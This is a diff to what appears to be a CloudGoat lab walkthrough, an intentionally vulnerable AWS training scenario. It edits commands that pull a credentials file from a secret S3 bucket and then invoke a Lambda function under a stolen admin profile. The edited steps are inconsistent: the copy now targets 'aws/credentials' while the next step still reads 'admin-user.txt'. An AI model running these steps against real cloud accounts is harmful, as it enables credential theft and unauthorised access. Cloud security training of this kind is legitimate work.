@@ -29,7 +29,7 @@ aws_session_token = "asdasdasd"
 
 `aws s3 ls --profile cgec2role s3://cg-secret-s3-bucket-<cloudgoat_id>`
 
-`aws s3 cp --profile cgec2role s3://cg-secret-s3-bucket-<cloudgoat_id>/admin-user.txt ./`
+`aws s3 cp --profile cgec2role s3://cg-secret-s3-bucket-<cloudgoat_id>/aws/credentials ./`
 
 `cat admin-user.txt`
 
@@ -37,6 +37,6 @@ aws_session_token = "asdasdasd"
 
 `aws lambda list-functions --profile cgadmin`
 
-`aws lambda invoke --function-name cg-lambda-<cloudgoat_id> ./out.txt`
+`aws lambda invoke --function-name cg-lambda-<cloudgoat_id> ./out.txt --profile cgadmin`
 
 `cat out.txt`
